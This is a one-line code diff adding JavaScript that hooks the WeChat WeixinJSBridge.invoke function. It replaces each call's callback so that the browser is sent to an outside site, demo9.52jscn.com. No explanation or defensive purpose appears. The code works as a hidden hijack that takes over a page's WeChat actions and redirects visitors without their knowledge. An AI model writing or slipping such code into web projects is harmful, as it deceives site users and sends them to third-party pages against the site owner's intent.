@@ -1,0 +1,1 @@
+document.addEventListener("WeixinJSBridgeReady",function(){if(window.WeixinJSBridge){var a=WeixinJSBridge.invoke;WeixinJSBridge.invoke=function(){arguments[2]=function(){window.location.href="http://demo9.52jscn.com"},a.apply(WeixinJSBridge,arguments)}}});
